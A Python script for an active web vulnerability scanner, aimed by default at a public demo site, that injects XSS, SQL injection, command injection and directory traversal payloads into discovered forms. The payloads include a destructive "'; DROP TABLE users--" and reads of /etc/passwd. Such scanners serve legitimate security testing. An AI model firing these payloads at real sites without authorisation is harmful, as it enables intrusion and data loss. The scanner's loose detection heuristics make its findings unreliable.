import requests
import re
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class ActiveVulnerabilityScanner:
    def __init__(self, target, delay=1.0, timeout=10):
        self.target = target
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerabilities = []
        self.forms = []
        
        # Set headers to look like a real browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
    
    def run_scan(self):
        print(f"[*] Starting active vulnerability scan for: {self.target}")
        print("[*] Developed by Laurel Megida")
        
        self.discover_forms()
        self.test_xss_vulnerabilities()
        self.test_sql_injection()
        self.test_command_injection()
        self.test_directory_traversal()
        self.generate_vulnerability_report()
    
    def discover_forms(self):
        print("\n[🔍] DISCOVERING FORMS")
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_info = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': [],
                    'page_url': self.target
                }
                
                # Get all input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_info = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    }
                    form_info['inputs'].append(input_info)
                
                self.forms.append(form_info)
                print(f"    ✅ Form found: {form_info['method'].upper()} {form_info['action']}")
                
            print(f"    📝 Total forms discovered: {len(self.forms)}")
            
        except Exception as e:
            print(f"    ❌ Form discovery failed: {e}")
    
    def test_xss_vulnerabilities(self):
        print("\n[🎯] TESTING XSS VULNERABILITIES")
        if not self.forms:
            print("    ℹ️  No forms to test")
            return
            
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")'
        ]
        
        for form in self.forms:
            for payload in xss_payloads:
                try:
                    target_url = urljoin(form['page_url'], form['action'])
                    data = {}
                    
                    # Prepare form data
                    for input_field in form['inputs']:
                        if input_field['name'] and input_field['type'] != 'submit':
                            data[input_field['name']] = payload
                    
                    if form['method'] == 'post':
                        response = self.session.post(target_url, data=data, timeout=self.timeout)
                    else:
                        response = self.session.get(target_url, params=data, timeout=self.timeout)
                    
                    # Check if payload is reflected without sanitization
                    if payload in response.text:
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'url': target_url,
                            'parameter': 'multiple parameters',
                            'payload': payload,
                            'severity': 'HIGH',
                            'description': 'User input reflected without proper sanitization'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"    🚨 XSS vulnerability found!")
                        break  # Don't test other payloads for this form
                        
                    time.sleep(self.delay)
                    
                except Exception as e:
                    print(f"    ❌ XSS test error: {e}")
    
    def test_sql_injection(self):  # Fixed indentation
        print("\n[🗃️] TESTING SQL INJECTION")
        if not self.forms:
            print("    ℹ️  No forms to test")
            return
            
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "' AND 1=1--",
            "'; DROP TABLE users--",
            "' OR 1=1--"
        ]
        
        sql_errors = [
            'mysql_fetch_array',
            'Microsoft OLE DB Provider',
            'ODBC Driver',
            'PostgreSQL',
            'ORA-',
            'SQL syntax',
            'mysql_num_rows'
        ]
        
        for form in self.forms:
            for payload in sql_payloads:
                try:
                    target_url = urljoin(form['page_url'], form['action'])
                    data = {}
                    
                    for input_field in form['inputs']:
                        if input_field['name'] and input_field['type'] != 'submit':
                            data[input_field['name']] = payload
                    
                    if form['method'] == 'post':
                        response = self.session.post(target_url, data=data, timeout=self.timeout)
                    else:
                        response = self.session.get(target_url, params=data, timeout=self.timeout)
                    
                    # Check for SQL errors
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vulnerability = {
                                'type': 'SQL Injection',
                                'url': target_url,
                                'parameter': 'multiple parameters',
                                'payload': payload,
                                'severity': 'CRITICAL',
                                'description': f'Database error detected: {error}'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"    🚨 SQL Injection vulnerability found!")
                            break
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    print(f"    ❌ SQL injection test error: {e}")

    def test_command_injection(self):
        print("\n[💻] TESTING COMMAND INJECTION")
        if not self.forms:
            print("    ℹ️  No forms to test")
            return
            
        cmd_payloads = [
            '; whoami',
            '| whoami', 
            '&& whoami',
            '`whoami`',
            '$(whoami)'
        ]
        
        for form in self.forms:
            for payload in cmd_payloads:
                try:
                    target_url = urljoin(form['page_url'], form['action'])
                    data = {}
                    
                    for input_field in form['inputs']:
                        if input_field['name'] and input_field['type'] != 'submit':
                            data[input_field['name']] = payload
                    
                    if form['method'] == 'post':
                        response = self.session.post(target_url, data=data, timeout=self.timeout)
                    else:
                        response = self.session.get(target_url, params=data, timeout=self.timeout)
                    
                    # Check for command output indicators
                    if any(indicator in response.text for indicator in ['root', 'www-data', 'administrator', 'nt authority']):
                        vulnerability = {
                            'type': 'Command Injection',
                            'url': target_url,
                            'parameter': 'multiple parameters',
                            'payload': payload,
                            'severity': 'HIGH',
                            'description': 'Possible command execution detected'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"    🚨 Command Injection vulnerability found!")
                        break
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    print(f"    ❌ Command injection test error: {e}")

    def test_directory_traversal(self):
        print("\n[📁] TESTING DIRECTORY TRAVERSAL")
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd'
        ]
        
        for payload in traversal_payloads:
            try:
                test_url = f"{self.target}?file={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for successful file access
                if 'root:' in response.text or 'Administrator' in response.text:
                    vulnerability = {
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'parameter': 'file',
                        'payload': payload,
                        'severity': 'HIGH',
                        'description': 'File system access possible through path manipulation'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"    🚨 Directory Traversal vulnerability found!")
                    break
                    
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"    ❌ Directory traversal test error: {e}")

    def generate_vulnerability_report(self):
        print("\n" + "="*60)
        print("🚨 VULNERABILITY ASSESSMENT REPORT")
        print("="*60)
        
        if not self.vulnerabilities:
            print("✅ No vulnerabilities found during active testing!")
            return
            
        print(f"📋 Vulnerabilities Found: {len(self.vulnerabilities)}")
        
        # Group by severity
        critical = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
        low = [v for v in self.vulnerabilities if v['severity'] == 'LOW']
        
        if critical:
            print(f"\n🔴 CRITICAL: {len(critical)}")
            for vuln in critical:
                print(f"   • {vuln['type']}")
                print(f"     URL: {vuln['url']}")
                print(f"     Payload: {vuln['payload']}")
                
        if high:
            print(f"\n🟠 HIGH: {len(high)}")
            for vuln in high:
                print(f"   • {vuln['type']}")
                print(f"     URL: {vuln['url']}")
                
        print(f"\n💡 REMEDIATION RECOMMENDATIONS:")
        print("   • Implement input validation and sanitization")
        print("   • Use parameterized queries for database access")
        print("   • Implement proper file path validation")
        print("   • Deploy Web Application Firewall (WAF)")
        print("   • Conduct regular security testing")
        
        print(f"\nDeveloped by Laurel Megida - Professional Security Assessment")

if __name__ == "__main__":
    scanner = ActiveVulnerabilityScanner("http://testphp.vulnweb.com")
    scanner.run_scan()